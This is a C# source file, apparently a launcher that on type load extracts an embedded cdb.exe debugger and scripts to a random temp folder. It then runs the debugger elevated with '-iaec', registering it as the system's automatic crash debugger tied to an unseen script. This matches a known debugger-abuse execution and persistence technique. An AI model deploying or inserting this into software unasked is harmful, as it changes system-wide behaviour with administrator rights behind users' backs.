using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace CDBExecutor {
    public class Worker {
        static readonly string architecture = IntPtr.Size == 4 ? "x86" : "x64";

        static readonly string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());        
        static readonly string scriptDirectory = Path.Combine(tempDirectory, "CDBExecutor", "Scripts");
        static readonly string cdbDirectory = Path.Combine(tempDirectory, "CDBExecutor", architecture);
        static Worker() {
            //cdb.exe -iaec "-noio -cf "C:\t\d.s""
            ExtractEmbeddedResources();
            PatchScripts();
          
            var process = new Process();
            process.StartInfo.FileName = Path.Combine(cdbDirectory, "cdb.exe");
            process.StartInfo.Arguments = "-iaec \"-noio -cf " + $"\"{Path.Combine(scriptDirectory, "d.s")}\"".Replace(@"\", @"\\").Replace("\"", "\\\"");                        
            process.StartInfo.Verb = "runas";            
            process.Start();
            process.WaitForExit();
        }        

        private static void PatchScripts() {
            foreach(var file in Directory.GetFiles(scriptDirectory)) {
                string content = "";
                using(var reader = new StreamReader(file)) {
                    content = reader.ReadToEnd();
                }
                var ext = Path.GetExtension(file);
                content = content.Replace("{tempDirectory}", FixBackslash(tempDirectory, ext));
                content = content.Replace("{scriptDirectory}", FixBackslash(scriptDirectory, ext));
                content = content.Replace("{cdbDirectory}", FixBackslash(cdbDirectory, ext));
                using (var writer = new StreamWriter(file, false)) {
                    writer.Write(content);
                }
            }
        }
        static string FixBackslash(string str, string ext) {
            if (ext == ".s")
                return str.Replace(@"\", @"\\");
            return str;
        }

        private static void ExtractEmbeddedResources() {
            foreach (var name in typeof(Worker).Assembly.GetManifestResourceNames()) {
                using (var stream = typeof(Worker).Assembly.GetManifestResourceStream(name)) {

                    var sname = name.Split('.');
                    var writeTo = Path.Combine(tempDirectory, String.Concat(sname.Take(sname.Length - 2).Select(x => x + "\\")), $"{sname[sname.Length - 2]}.{sname[sname.Length - 1]}");
                    var writeToDir = Path.GetDirectoryName(writeTo);
                    if (!Directory.Exists(writeToDir))
                        Directory.CreateDirectory(writeToDir);

                    using (var fs = new FileStream(writeTo, FileMode.CreateNew, FileAccess.Write)) {
                        stream.CopyTo(fs);
                    }
                }
            }
        }

        public string GetTemporaryDirectory()
        {
            string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            return tempDirectory;
        }
        [MethodImpl(MethodImplOptions.NoInlining|MethodImplOptions.NoOptimization)]
        public static void Start(){ }
    }
}